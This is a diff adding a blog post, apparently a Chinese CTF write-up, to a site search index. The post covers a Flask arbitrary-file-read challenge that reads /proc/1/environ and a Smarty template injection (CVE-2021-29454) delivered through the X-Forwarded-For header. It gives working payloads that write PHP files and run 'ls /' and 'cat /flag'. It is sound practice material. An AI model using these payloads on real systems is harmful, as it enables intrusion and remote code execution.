@@ -530,4 +530,178 @@ while len(grid):
         <tag>复现</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DASCTF2024十月赛</title>
+    <url>/posts/d9660052/</url>
+    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><p>创建实例，提示：</p>
+<pre><code>Welcome to My Flask App
+
+This is a simple web app using Flask.  
+</code></pre>
+<p>给出了任意文件读功能  </p>
+<p>看看 flask 应用的目录结构：  </p>
+<pre><code>my_flask_app/
+│
+├── app/
+│   ├── __init__.py
+│   ├── routes/
+│   │   ├── __init__.py
+│   │   ├── main.py
+│   │   └── auth.py
+│   ├── models/
+│   │   ├── __init__.py
+│   │   └── user.py
+│   ├── templates/
+│   │   ├── layout.html
+│   │   └── home.html
+│   └── static/
+│       ├── css/
+│       └── js/
+│
+├── config.py
+├── requirements.txt
+├── migrations/
+│   └── ...
+└── run.py  
+</code></pre>
+<p>所以源码应该在 &#x2F;app&#x2F;main.py 中</p>
+<p>读源码：  </p>
+<pre><code>from flask import Flask, request, render_template_string, abort
+
+app = Flask(__name__)
+
+HOME_PAGE_HTML = &#39;&#39;&#39;
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+    &lt;title&gt;Flask Web Application&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;h1 class=&quot;display-4 text-center&quot;&gt;Welcome to My Flask App&lt;/h1&gt;
+    &lt;p class=&quot;lead text-center&quot;&gt;This is a simple web app using Flask.&lt;/p&gt;
+    &lt;div class=&quot;text-center&quot;&gt;
+        &lt;a href=&quot;/file?f=example.txt&quot; class=&quot;btn btn-primary&quot;&gt;Read example.txt&lt;/a&gt;
+    &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&#39;&#39;&#39;
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template_string(HOME_PAGE_HTML)
+
+@app.route(&#39;/file&#39;)
+def file():
+    file_name = request.args.get(&#39;f&#39;)
+
+    if not file_name:
+        return &quot;Error: No file parameter provided.&quot;, 400
+
+    try:
+        with open(file_name, &#39;r&#39;) as file:
+            content = file.read()
+        return content
+    except FileNotFoundError:
+        return abort(404, description=&quot;File not found.&quot;)
+    except Exception as e:
+        return f&quot;Error reading file.&quot;, 500
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&quot;127.0.0.1&quot;, port=8080)  
+</code></pre>
+<p>尝试读环境变量，查资料得知，Linux 系统存在如下敏感路径（在存在获取任意文件读时）</p>
+<pre><code>/etc/passwd
+</code></pre>
+<p>该文件储存了该 Linux 系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 Shell （以冒号作为分隔符）</p>
+<pre><code>/proc/self
+</code></pre>
+<p>proc 是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过 &#x2F;proc&#x2F;PID 可以访问对应 PID 的进程内核数据，而 &#x2F;proc&#x2F;self  访问的是当前进程的内核数据。</p>
+<pre><code>/proc/self/cmdline
+</code></pre>
+<p>该文件包含的内容为当前进程执行的命令行参数。</p>
+<pre><code>/proc/self/mem
+</code></pre>
+<p>&#x2F;proc&#x2F;self&#x2F;mem 是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合 &#x2F;proc&#x2F;self&#x2F;maps 中的偏移地址进行读取。通过参数 start 和 end 及偏移地址值读取内容。</p>
+<pre><code>/proc/self/maps
+</code></pre>
+<p>&#x2F;proc&#x2F;self&#x2F;maps 包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</p>
+<pre><code>flask-session结构
+</code></pre>
+<p> flask_session 是 flask 框架实现 session 功能的一个插件。其 session 结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session 默认 session 的储存是在用户 Cookie 中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。  </p>
+<p>查阅资料，得知 environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看 environ 目录来获取指定进程的环境变量信息  </p>
+<p>因此<code>/file?f=/proc/1/environ</code>读到flag  </p>
+<p>参考：</p>
+<blockquote>
+<p><a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.cnblogs.com/niyani/p/17074125.html">攻防世界-cat_cat_new（flask_session伪造、&#x2F;proc&#x2F;self&#x2F;文件夹）</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.runoob.com/flask/flask-layout.html">Flask 项目结构</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/15986?time__1311=GqjxcD2DnDRWDsD7zY0=GOQGCYy2Dw74rD">DASCTF 2024 十月挑战赛</a>  </p>
+</blockquote>
+<p>DASCTF十月赛其他题太过于抽象了 ~ <del>&gt;_&lt;</del> ~</p>
+<h2 id="CISCN2019-华东南赛区-Web11-1"><a href="#CISCN2019-华东南赛区-Web11-1" class="headerlink" title="[CISCN2019 华东南赛区] Web11 1"></a>[CISCN2019 华东南赛区] Web11 1</h2><p>刚刚进入实例,一时不知所措  </p>
+<p>后面看到XFF </p>
+<p>使用BP抓包,没发现什么特别的  </p>
+<p>在页面底部发现一行字：Build With Smarty !  </p>
+<p>查阅资料得知,   Smarty 是 PHP 的模板引擎，有助于将表示 (HTML&#x2F;CSS) 与应用程序逻辑分离。在 3.1.42 和 4.0.2 版本之前，模板作者可以通过制作恶意数学字符串来运行任意 PHP 代码。如果数学字符串作为用户提供的数据传递给数学函数，则外部用户可以通过制作恶意数学字符串来运行任意 PHP 代码。用户应升级到版本 3.1.42 或 4.0.2 以接收补丁。  </p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/11085?time__1311=Cq0x2Qi=omqYqGNDQie7IK0IbbbmOa4D">CVE-2021-29454——Smarty模板注入</a>  </p>
+</blockquote>
+<p>所以我们可以尝试注入如下代码:</p>
+<pre><code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;
+</code></pre>
+<p>但传递这个Payload需要注入点,这里只有XFF可以入手  </p>
+<p>BP这样写:  </p>
+<pre><code>GET / HTTP/1.1
+Host: node5.buuoj.cn:25829
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Sec-GPC: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+X-Forwarded-For: string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;
+Content-Length: 2
+</code></pre>
+<p>发送两次,发现读到环境变量,代码执行成功  </p>
+<p>然后XFF传递<code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;ls /&#39;));&quot;,$s)&#125;</code>  </p>
+<pre><code>bin
+dev
+etc
+flag
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+usr
+var
+</code></pre>
+<p>读到存在flag目录,直接 cat &#x2F;flag  </p>
+<p>XFF payload: <code>string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+eval(system(&#39;cat /flag&#39;));&quot;,$s)&#125;</code>  </p>
+<p>得到flag  </p>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
 </search>
